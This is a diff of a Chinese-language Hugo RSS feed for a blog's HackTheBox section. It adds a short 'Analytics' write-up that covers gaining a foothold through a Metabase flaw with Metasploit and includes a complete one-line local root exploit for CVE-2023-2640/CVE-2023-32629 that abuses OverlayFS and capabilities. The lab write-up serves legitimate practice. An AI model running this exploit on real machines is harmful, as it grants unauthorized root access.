@@ -7,7 +7,36 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Example Person</copyright>
-        <lastBuildDate>Wed, 19 Mar 2025 14:16:03 +0800</lastBuildDate><atom:link href="https://example.com/categories/htb/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Wed, 19 Mar 2025 14:34:54 +0800</lastBuildDate><atom:link href="https://example.com/categories/htb/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Analytics</title>
+        <link>https://example.com/htb/analytics/</link>
+        <pubDate>Wed, 19 Mar 2025 14:33:16 +0800</pubDate>
+        
+        <guid>https://example.com/htb/analytics/</guid>
+        <description>&lt;h1 id=&#34;寻找立足点&#34;&gt;寻找立足点
+&lt;/h1&gt;&lt;p&gt;扫描端口正常1，有域名扫子域名正常，目录爆破也没东西&lt;/p&gt;
+&lt;p&gt;在登录页面看到是matebases&lt;/p&gt;
+&lt;p&gt;msf存在可以利用漏洞&lt;/p&gt;
+&lt;p&gt;改参数执行拿到shell&lt;/p&gt;
+&lt;h1 id=&#34;权限提升&#34;&gt;权限提升
+&lt;/h1&gt;&lt;p&gt;linpeas.sh扫不到东西&lt;/p&gt;
+&lt;p&gt;uname -r查看内核&lt;/p&gt;
+&lt;p&gt;发现适合&lt;/p&gt;
+&lt;p&gt;CVE-2023-2640-CVE-2023-32629&lt;/p&gt;
+&lt;p&gt;执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;unshare -rm sh -c &amp;#34;mkdir l u w m &amp;amp;&amp;amp; cp /u*/b*/p*3 l/;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;amp;&amp;amp; touch m/*;&amp;#34; &amp;amp;&amp;amp; u/python3 -c &amp;#39;import os;os.setuid(0);os.system(&amp;#34;/bin/bash&amp;#34;)&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
+        </item>
+        <item>
         <title>Seal</title>
         <link>https://example.com/htb/seal/</link>
         <pubDate>Wed, 19 Mar 2025 14:05:44 +0800</pubDate>
@@ -161,14 +190,6 @@
 	
 &gt;&lt;/p&gt;
 </description>
-        </item>
-        <item>
-        <title>Test</title>
-        <link>https://example.com/htb/test/</link>
-        <pubDate>Thu, 13 Mar 2025 11:49:13 +0800</pubDate>
-        
-        <guid>https://example.com/htb/test/</guid>
-        <description></description>
         </item>
         
     </channel>
